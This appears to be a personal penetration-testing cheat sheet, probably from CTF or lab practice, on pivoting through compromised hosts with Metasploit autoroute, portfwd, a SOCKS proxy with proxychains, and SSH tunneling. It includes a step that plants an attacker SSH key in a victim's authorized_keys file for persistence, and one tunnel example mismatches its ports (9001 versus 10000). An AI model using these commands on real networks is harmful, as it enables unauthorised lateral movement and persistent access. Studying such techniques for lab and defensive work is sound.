 <h2> Proxying </h2> <br>
 
  If you have a MSFCONSOLE shell on a machine (generate payload via msfvenom if needed and run and set multi/handler on msfconsole <br>
  background session -- background <br>
  use post/multi/manage/autoroute <br>
  set SESSION 1 (change if more than 1 session) <br>
  set SUBNET 10.200.3.0 (change to submet needed) <br>
  exploit <br>
  msfconsole<br>
pivoting, check ifconfig when you have a shell on the machine if you have a meterpreter shell, are there multiple nics?<br>
if yes, use autoroute<br>
background session -- background<br>
use post/multi/manage/autoroute<br>
set SESSION 1 (change if more than 1 session)<br>
set SUBNET 10.200.3.0 (change to submet needed)<br>
exploit<br>
if that doesnt work make sure your back in your session and run (change IPs) -- meterpreter > run autoroute -s 192.181.243.1/24 <br>
now you can use further auxiliary commands against the machine pivoting towards<br>
has nmap command which can be used with script comnmand --script(useful for pivoting)<br>
  background <br>
  for portscan - use auxiliary/scanner/portscan/tcp <br>
  set options and set everything <br>
  run <br>
  Identify ports of interest, now need to configure port forward. <br>
  access the session -- sessions -i NUMBER <br>
  ensure meterpreter shell and type -- portfwd add -l (PORT TO FORWARD, e.g. 555) -p (PORT ATTACKING) -r victimIP <br>
  background session <br>
  Now perform nmap -sV -sC scan on ported for e.g. -p 555 localhost still in msfconsole console
  Once found an exploit for version type -- search SERVICE and use whatever exploit <br>
  set IP to actual machines ip 
  exploit 
  
  
  <h2> Proxychains </h2>
  <br>
   If you have a MSFCONSOLE shell on a machine (generate payload via msfvenom if needed and run and set multi/handler on msfconsole <br>
  background session -- background <br>
  use post/multi/manage/autoroute <br>
  set SESSION 1 (change if more than 1 session) <br>
  set SUBNET 10.200.3.0 (change to submet needed) <br>
  exploit <br>
  Now setup proxy <br>
 use auxiliary/server/socks_proxy <br>
 set VERSION 5 <br>
  type -- run <br>
 edit proxychains to socks5 and same port as metasploit using localhost 127.0.0.1 (/etc/proxychains.conf) <br>
 type --- proxychains nmap -T4 IP/CIDR and look for "OK" <br>
 every command is the same just add proxychains before
  
  
<h2> SSH Tunneling </h2> <br>
If you manage to get into a box via SSH or have comprimised a box and are able to ssh to the box <b>(if you have a shell as a user you can generate a new public key on my own kali machine -- ssh-keygen give it a name and a passphrase, then add this to the users ssh key file echo "your-ssh-public-key-contents" >> /home/apaar/.ssh/authorized_keys),</b> you can check what local ports are running and then use SSH tunneling to access these from your attack machine <br>
when on the comprimised host (if linux) type -- ss -tulpn (take a look at ports running and the port number) <br>
if port 9001 is running and of interest youd type on your local machine  ssh apaar@10.10.202.42 -i key -L 9001:127.0.0.1:9001 (replace with username of victim machine and ip) <br>
 then browse to port by browser -- localhost:10000 <br>
